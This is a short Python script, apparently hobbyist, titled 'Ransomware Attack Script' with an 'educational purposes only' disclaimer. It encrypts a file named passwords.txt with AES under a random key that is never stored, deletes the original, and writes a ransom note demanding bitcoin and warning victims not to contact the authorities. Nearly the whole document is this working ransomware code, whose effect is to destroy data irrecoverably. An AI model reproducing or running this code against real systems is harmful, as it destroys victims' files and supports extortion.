# This script is for educational purposes only. Use it responsibly and legally.
# Ransomware Attack Script - by Ginerica Alexandru

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os

def encrypt_file(file_path, key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as f:
        file_data = f.read()

    padded_data = pad(file_data, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    encrypted_file_path = file_path + ".axel"
    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + encrypted_data)

    return encrypted_file_path

def create_ransom_note():
    ransom_note = """
    --- RANSOM NOTE ---

    All your files have been encrypted!
    To decrypt them, you need to pay a ransom.
    
    Do not contact the authorities.
     
    In order to receive the decryption key pay 0.5 bitcoins
     
    to the following address: lucian@bitcoin.net 
    
    We will send you the decryption key once you comply.

    --- END OF NOTE ---
    """

    with open("ransom_note.txt", 'w') as f:
        f.write(ransom_note)

def simulate_ransomware(file_path):
    key = get_random_bytes(32) # 256-bit AES key
    encrypted_file = encrypt_file(file_path, key)
    create_ransom_note()
    print(f"File encrypted: {encrypted_file}")
    print("Ransom note created: ransom_note.txt")


if __name__ == "__main__":
    file_to_encrypt = "passwords.txt"

    if os.path.exists(file_to_encrypt):
        simulate_ransomware(file_to_encrypt)
        os.remove(file_to_encrypt)
    else:
        print(f"The file '{file_to_encrypt}' does not exist.")